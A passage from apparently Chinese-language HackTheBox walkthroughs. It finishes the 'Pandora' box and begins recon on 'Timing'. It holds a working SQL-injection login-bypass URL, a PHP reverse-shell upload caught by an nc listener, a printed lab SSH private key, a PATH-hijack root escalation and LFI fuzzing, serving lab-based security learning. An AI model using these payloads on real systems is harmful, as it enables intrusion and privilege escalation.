|\n+---------+---------+----------+----------------------------------+------------+\n```\n首先使用如下poc进行跳过\n\n```bash\nhttp://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO\n```\n然后直接访问[http://127.0.0.1/pandora\\_console/](http://127.0.0.1/pandora_console/)即可以admin权限进行登录\n\n![](Hackthebox-Pandora/45d4ee8d-aa50-4f1e-a340-27797e4dd157.png)\n\n![](Hackthebox-Pandora/ad167d54-ce9c-4c00-a1b9-595e2a106af5.png)\n\n选择 Admin tools -> File manager\n\n> [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)\n\n使用该shell，先保存到本地然后稍微修改一下\n\n![](Hackthebox-Pandora/6de77216-aa87-468f-ae88-b15eb6f4e3c7.png)\n\n然后upload file上传\n\n![](Hackthebox-Pandora/07ca810c-e853-4818-b59a-4cbe1c5e8fc8.png)\n\n传上去后在[http://127.0.0.1/pandora\\_console/images/phpshell.php](http://127.0.0.1/pandora_console/images/phpshell.php)可以找到shell\n\n本地启动一个nc监听端口，然后访问该shell\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                     \nlistening on [any] 4444 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.11.136] 58582\nLinux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n 03:15:11 up 15 min,  4 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\ndaniel   pts/0    10.10.14.17      03:00   14:23   0.03s  0.03s -bash\ndaniel   pts/1    10.10.14.20      03:01   11:35   0.26s  0.21s python3 sqlpwn.py -t localhost\ndaniel   pts/2    10.10.14.128     03:02   11.00s  0.20s  0.02s ssh -L 8000:localhost:80 daniel@pandora.htb\ndaniel   pts/4    127.0.0.1        03:14   15.00s  0.02s  0.02s -bash\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami&&id\nmatt\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n```\n成功拿到matt权限的shell\n\n```bash\n$ cat user.txt\n083fe340ff06c9a855f56ee98eaa62fd\n```\n成功拿到user权限的flag文件\n\n### Root\n```bash\nmatt@pandora:/home/matt$ find / -perm -u=s 2> /dev/null\nfind / -perm -u=s 2> /dev/null\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/pandora_backup\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/at\n/usr/bin/fusermount\n/usr/bin/chsh\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n```\n检查一下可利用文件\n\n其中/usr/bin/pandora\\_backup可利用\n\n```bash\nmatt@pandora:/home/matt$ sudo /usr/bin/pandora_backup\nsudo /usr/bin/pandora_backup\nsudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted\nsudo: unable to initialize policy plugin\n```\n直接利用会错误，我们需要一个更加稳定的shell\n\n由于我们没有matt的密码，所以无法直接用ssh登录，也没找到ssh的秘钥，所以我们自己生成一个\n\n```bash\nmatt@pandora:/home/matt$ ssh-keygen\nssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/matt/.ssh/id_rsa): \n\nEnter passphrase (empty for no passphrase): \n\nEnter same passphrase again: \n\nYour identification has been saved in /home/matt/.ssh/id_rsa\nYour public key has been saved in /home/matt/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:SDMstiuKB3DRqypXDzX385OV0v8MrIh+lQE0alNduQ4 matt@pandora\nThe key's randomart image is:\n+---[RSA 3072]----+\n|   .     .+. ... |\n|  . ..   o... .  |\n|   .o.= +  .   . |\n|. ...+o=..  E .  |\n|.. ....oS.   * . |\n|. . o.    o +.=  |\n| o...o     + +o. |\n|+.o.  .  ...+. o.|\n|+o     .o.. ..  +|\n+----[SHA256]-----+\n```\n```bash\nmatt@pandora:/home/matt$ cd .ssh\ncd .ssh\nmatt@pandora:/home/matt/.ssh$ ls\nls\nid_rsa  id_rsa.pub\nmatt@pandora:/home/matt/.ssh$ cat id_rsa.pub > authorized_keys\ncat id_rsa > authorized_keys\nmatt@pandora:/home/matt/.ssh$ chmod 700 authorized_keys\nchmod 600 authorized_keys\n```\n```bash\nmatt@pandora:/home/matt/.ssh$ cat id_rsa\ncat authorized_keys\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# vim id_rsa    \n\n┌──(root💀kali)-[~/Desktop]\n└─# chmod 700 id_rsa    \n\n┌──(root💀kali)-[~/Desktop]\n└─# cat id_rsa     \n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n```\n然后使用ssh进行登录\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh matt@pandora.htb -i id_rsa\nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue 18 Jan 05:59:56 UTC 2022\n\n  System load:  0.09              Processes:             280\n  Usage of /:   63.0% of 4.87GB   Users logged in:       1\n  Memory usage: 9%                IPv4 address for eth0: 10.10.11.136\n  Swap usage:   0%\n\n  => /boot is using 91.8% of 219MB\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nmatt@pandora:~$ whoami&&id\nmatt\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n```\n切换到matt的用户目录，然后创建一个假的tar可执行文件，，并将matt的家路径注入PATH变量中\n\n```bash\ncd /home/matt/\necho \"/bin/bash\" > tar\nchmod +x tar\nexport PATH=/home/matt:$PATH\n```\n然后运行/usr/bin/pandora\\_backup文件\n\n```bash\nmatt@pandora:~$ /usr/bin/pandora_backup\nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\nroot@pandora:~# whoami&&id\nroot\nuid=0(root) gid=1000(matt) groups=1000(matt)\n```\n成功提权到root用户\n\n```bash\nroot@pandora:~# cd /root\nroot@pandora:/root# ls\nroot.txt\nroot@pandora:/root# cat root.txt \n262d5cfca2599a11b0c1dcfa552a150e\n```\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Timing - Hackthebox","url":"/2022/01/01/Hackthebox/Medium/Hackthebox-Timing/","content":"\n# Hackthebox - Timing\n## 靶场信息\n![](Hackthebox-Timing/3f90e5fc-5165-447e-ba8d-10d2d71bef4b.png)\n\n## 靶场类型\n![](Hackthebox-Timing/a6ecbfb1-1f6d-4741-a9c8-79a1d5a38651.jpeg)\n\n## 信息搜集\n使用nmap进行端口扫描\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.135\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 00:09 EST\nNmap scan report for bogon (10.10.11.135)\nHost is up (0.28s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)\n|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)\n|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/14%OT=22%CT=1%CU=39140%PV=Y%DS=2%DC=T%G=Y%TM=61B828\nOS:78%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=F9%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3\nOS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F\nOS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW\nOS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF\nOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                             \n\nTRACEROUTE (using port 5900/tcp)                                                                                                                                                                                    \nHOP RTT       ADDRESS                                                                                                                                                                                               \n1   278.35 ms 10.10.14.1                                                                                                                                                                                            \n2   278.35 ms bogon (10.10.11.135)                                                                                                                                                                                  \n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                               \nNmap done: 1 IP address (1 host up) scanned in 347.67 seconds\n```\n先去80端口看看是什么服务\n\n![](Hackthebox-Timing/ba83c4f8-90f8-41a5-b1db-a4e0c3b1ca75.png)\n\n这是一个登录页面，测试一下弱口令没有突破口，扫一下目录看看\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.135/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Extensions       : .php \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\nlogin.php               [Status: 200, Size: 5609, Words: 1755, Lines: 178]\nimages                  [Status: 301, Size: 313, Words: 20, Lines: 10]\nindex.php               [Status: 302, Size: 0, Words: 1, Lines: 1]\njs                      [Status: 301, Size: 309, Words: 20, Lines: 10]\ncss                     [Status: 301, Size: 310, Words: 20, Lines: 10]\nprofile.php             [Status: 302, Size: 0, Words: 1, Lines: 1]\nlogout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\nimage.php               [Status: 200, Size: 0, Words: 1, Lines: 1]\nupload.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\nheader.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\nfooter.php              [Status: 200, Size: 3937, Words: 1307, Lines: 116]\n.                       [Status: 302, Size: 0, Words: 1, Lines: 1]\ndb_conn.php             [Status: 200, Size: 0, Words: 1, Lines: 1]\n:: Progress: [86006/86006] :: Job [1/1] :: 70 req/sec :: Duration: [0:17:21] :: Errors: 8 ::\n```\n这边没有跳转的只有一个image.php，但是是空白的，同时还存在一个images目录，我感觉这里有点问题，去看看images目录有啥东西\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.135/images/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/images/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Extensions       : .php \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\nuploads                 [Status: 301, Size: 321, Words: 20, Lines: 10]\n:: Progress: [86006/86006] :: Job [1/1] :: 78 req/sec :: Duration: [0:15:38] :: Errors: 4 ::\n```\n目录/images/uploads/目录，然后还存在一个image.php文件，我总觉得是这个目录内的文件，是通过image.php这个文件来查看的，fuzz一下看看\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.135/image.php?file=FUZZ\" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/image.php?file=FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\n/etc/httpd/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ftpchroot          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/grub.conf          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/chrootUsers        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/apache2/apache2.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/shadow             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/fstab              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/hosts              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/logrotate.d/proftpd [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ftphosts           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/logrotate.d/ftp    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/groups             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/cron.deny          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/access.conf  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/inetd.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/srm.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/cron.allow         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/at.allow           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/httpd.conf   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/aliases            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/lighttpd.conf      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/chttp.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/issue              [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/anacrontab         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/passwd             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/php.ini      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/mysql/my.cnf       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/lilo.conf          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/npasswd            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/profile            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/crontab            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/cups/cupsd.conf    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pureftpd.passwd    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/networks           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/motd               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/bashrc             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/lsb-release        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/my.cnf             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4.4/fcgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/logrotate.d/vsftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pureftpd.pdb       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/php4/php.ini   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/samba/smb.conf     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_config     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/sysconfig/network  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ftpaccess          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/apache2/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/passwd             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/modules.conf       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php5/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/termcap            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 